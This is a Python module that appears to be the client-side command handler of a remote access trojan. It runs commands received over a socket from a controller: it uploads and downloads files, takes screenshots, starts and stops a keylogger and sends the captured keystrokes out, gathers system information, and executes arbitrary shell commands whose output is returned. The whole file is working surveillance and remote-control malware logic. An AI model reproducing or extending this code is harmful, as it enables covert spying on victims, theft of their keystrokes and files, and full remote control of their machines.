from .system_info import gather_detailed_sysinfo
from .file_transfer import download_file, upload_file
from .screenshot import take_screenshot
from .keylogger import start_keylogger, stop_keylogger, send_keylogs
import subprocess
import os

def execute_command(command_data, sock):
    from ..communication import send_data  # Import inside the function to avoid circular import
    
    command = command_data.get('cmd', '').strip()
    args = command_data.get('args', '')
    
    if command == 'q':
        return
    elif command == 'kill_client':
        send_data(sock, {"status": "info", "message": "Client received kill_client command. Terminating."})
        # TODO: Implement client termination logic here if needed
        return True
    elif command == 'upload':
        if args:
            download_file(sock, args)
        else:
            send_data(sock, {"status": "error", "message": "Upload command received without filename."})
    elif command == 'download':
        if args:
            upload_file(sock, args)
        else:
            send_data(sock, {"status": "error", "message": "Download command received without filename."})
    elif command == 'cd':
        path = args or ".."
        try:
            os.chdir(path)
            send_data(sock, {"type": "cmd_result", "output": f"Current directory changed to: {os.getcwd()}"})
        except Exception as e:
            send_data(sock, {"type": "cmd_result", "output": f"Error changing directory: {str(e)}"})
    elif command == 'screenshot':
        take_screenshot(sock)
    elif command == 'keylog_start':
        start_keylogger(sock)
    elif command == 'keylog_stop':
        stop_keylogger(sock)
    elif command == 'get_keylogs':
        send_keylogs(sock)
    elif command == 'sysinfo':
        gather_detailed_sysinfo(sock)
    else:
        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, errors='replace')
        result = proc.stdout.read() + proc.stderr.read()
        send_data(sock, {"type": "cmd_result", "output": result if result else "Command executed (no output)."})